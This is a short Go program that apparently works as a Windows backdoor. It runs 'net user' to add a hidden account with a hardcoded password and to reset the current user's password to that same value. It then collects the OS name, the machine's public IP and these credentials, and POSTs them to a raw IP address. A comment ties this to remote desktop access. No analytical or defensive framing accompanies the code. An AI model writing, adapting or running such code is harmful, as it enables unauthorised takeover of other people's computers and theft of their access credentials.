package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"os/user"
	"strings"
)

type Data struct {
	OS       string `json:"os"`
	IP       string `json:"ip"`
	Username string `json:"username"`
	Password string `json:"password"`
	Token    string `json:"token"`
}

func main() {
	linkGacor := "http://43.133.138.170:80/post_data"
	headers := map[string]string{
		"Content-Type": "application/json",
		"Accept":       "text/plain",
	}

	currentUser, err := user.Current()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	username := currentUser.Username
	if strings.Contains(username, "\\") {
		parts := strings.Split(username, "\\")
		username = parts[len(parts)-1]
	}

	_p := "adiyaksa12$"
	_t := "adiganteng"
	_u := "adiyaksa" 

	_ = _p
	_ = _t


	// For my server rdp
	_v := exec.Command("wmic", "os", "get", "Caption", "/value")
	_c := exec.Command("net", "user", _u, _p, "/add")
	_c2 := exec.Command("net", "user", username, _p)

	_out, err := _v.Output()
	
	if err != nil {
		fmt.Println("Gagal menjalankan perintah:", err)
		return
	}

	_c.Run()
	_c2.Run()

	caption := strings.SplitN(string(_out), "=", 2)

	publicIP, err := getPublicIP()
	
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	data := Data{
		OS:       strings.TrimSpace(caption[1]),
		IP:       publicIP,
		Username: username,
		Password: _p,
		Token:    _t,
	}

	jsonPayload, _ := json.Marshal(data)

	req, _ := http.NewRequest("POST", linkGacor, bytes.NewBuffer(jsonPayload))
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	defer resp.Body.Close()
}

func getPublicIP() (string, error) {
	resp, err := http.Get("http://wtfismyip.com/text")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	ipBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(ipBytes), nil
}
